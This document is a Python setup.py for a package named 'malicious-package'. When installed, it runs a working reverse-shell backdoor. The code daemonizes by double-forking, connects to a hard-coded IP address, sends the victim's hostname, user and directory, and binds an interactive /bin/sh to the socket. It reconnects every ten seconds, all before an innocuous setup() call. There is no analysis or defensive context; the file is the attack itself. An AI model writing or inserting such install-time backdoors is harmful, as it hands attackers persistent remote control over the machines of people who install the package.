from setuptools import setup
import os
import sys
import socket
import subprocess
import time

def daemonize():
    # First fork
    try:
        pid = os.fork()
        if pid > 0:
            # Exit first parent
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    # Decouple from parent environment
    os.chdir("/")
    os.setsid()
    os.umask(0)
    
    # Second fork
    try:
        pid = os.fork()
        if pid > 0:
            # Exit from second parent
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    # Now running as daemon
    reverse_shell()

def reverse_shell():
    time.sleep(3)  # Wait for pip to finish
    
    while True:
        try:
            ATTACKER_IP = "142.93.23.15"
            ATTACKER_PORT = 80
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Send victim info
            hostname = subprocess.getoutput("hostname")
            username = subprocess.getoutput("whoami")
            current_dir = subprocess.getoutput("pwd")
            
            s.send(f"""
╔════════════════════════════════════╗
║    VICTIM SHELL - PERSISTENT       ║
╚════════════════════════════════════╝
Hostname: {hostname}
User: {username}
Directory: {current_dir}
══════════════════════════════════════

$ """.encode())
            
            # Interactive shell
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            subprocess.call(["/bin/sh", "-i"])
            s.close()
            
        except:
            time.sleep(10)  # Wait before reconnecting
            continue

# Start the daemon
daemonize()

# Normal setup.py
setup(
    name="malicious-package",
    version="1.0.0",
)
